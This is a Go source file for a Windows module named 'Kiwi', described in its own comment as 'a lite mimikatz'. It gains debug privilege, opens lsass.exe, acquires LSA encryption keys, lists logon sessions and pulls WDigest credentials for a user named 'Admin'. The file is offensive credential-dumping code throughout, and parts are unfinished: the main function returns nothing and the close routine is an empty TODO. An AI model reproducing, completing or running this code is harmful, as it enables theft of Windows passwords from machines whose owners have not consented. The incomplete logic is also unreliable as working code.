// +build windows

package kiwi

import (
	"fmt"
	"runtime"
	"sync"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/logger"
	"project/internal/module/windows/api"
	"project/internal/module/windows/privilege"
	"project/internal/random"
)

// Kiwi is a lite mimikatz.
type Kiwi struct {
	logger logger.Logger

	rand *random.Rand

	// is get debug privilege
	debug bool

	// 0 = not read, 1 = true, 2 = false
	wow64 uint8

	// PID of lsass.exe
	pid uint32

	// about lsa keys
	iv      []byte
	key3DES *api.BcryptKey
	keyAES  *api.BcryptKey

	// address about logon session
	logonSessionListAddr      uintptr
	logonSessionListCountAddr uintptr

	wdigestPrimaryOffset int
	wdigestCredAddr      uintptr

	// lock above fields
	mu sync.Mutex

	// version about windows
	major uint32
	minor uint32
	build uint32
	verMu sync.Mutex

	// modules about lsass.exe
	modules    []*basicModuleInfo
	modulesRWM sync.RWMutex
}

// NewKiwi is used to create a new kiwi module.
func NewKiwi(logger logger.Logger) (*Kiwi, error) {
	switch arch := runtime.GOARCH; arch {
	case "386", "amd64":
	default:
		return nil, errors.Errorf("current architecture %s is not supported", arch)
	}
	return &Kiwi{logger: logger, rand: random.NewRand()}, nil
}

func (kiwi *Kiwi) log(lv logger.Level, log ...interface{}) {
	kiwi.logger.Println(lv, "kiwi", log...)
}

func (kiwi *Kiwi) logf(lv logger.Level, format string, log ...interface{}) {
	kiwi.logger.Printf(lv, "kiwi", format, log...)
}

// EnableDebugPrivilege is used to enable debug privilege.
func (kiwi *Kiwi) EnableDebugPrivilege() error {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.debug {
		return nil
	}
	err := privilege.EnableDebugPrivilege()
	if err != nil {
		return err
	}
	kiwi.debug = true
	return nil
}

// GetAllCredential is used to get all credentials from lsass.exe memory.
func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
	// check is running on WOW64
	wow64, err := kiwi.isWow64()
	if err != nil {
		return nil, err
	}
	if wow64 {
		return nil, errors.New("can't access x64 process")
	}
	pid, err := kiwi.getLSASSProcessID()
	if err != nil {
		return nil, err
	}
	pHandle, err := kiwi.getLSASSHandle(pid)
	if err != nil {
		return nil, err
	}
	defer api.CloseHandle(pHandle)
	kiwi.logf(logger.Info, "process handle of lsass.exe is 0x%X", pHandle)
	err = kiwi.acquireLSAKeys(pHandle)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to acquire LSA keys")
	}
	sessions, err := kiwi.getLogonSessionList(pHandle)
	if err != nil {
		return nil, err
	}
	for _, session := range sessions {
		fmt.Println("Domain:", session.Domain)
		fmt.Println("Username:", session.Username)
		fmt.Println("Logon server:", session.LogonServer)
		fmt.Println("SID:", session.SID)
		fmt.Println()
		if session.Username == "Admin" {
			kiwi.getWdigestList(pHandle, session.LogonID)
		}

	}

	return nil, nil
}

// acquireLSAKeys is used to get IV and generate 3DES key and AES key.
func (kiwi *Kiwi) acquireLSAKeys(pHandle windows.Handle) error {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.key3DES != nil {
		return nil
	}
	major, _, _ := kiwi.getWindowsVersion()
	switch major {
	case 5:
		return kiwi.acquireNT5LSAKeys(pHandle)
	case 6, 10:
		return kiwi.acquireNT6LSAKeys(pHandle)
	default:
		return errors.Errorf("unsupported NT major version: %d", major)
	}
}

// Close is used to close kiwi module TODO destroy key
func (kiwi *Kiwi) Close() {

}
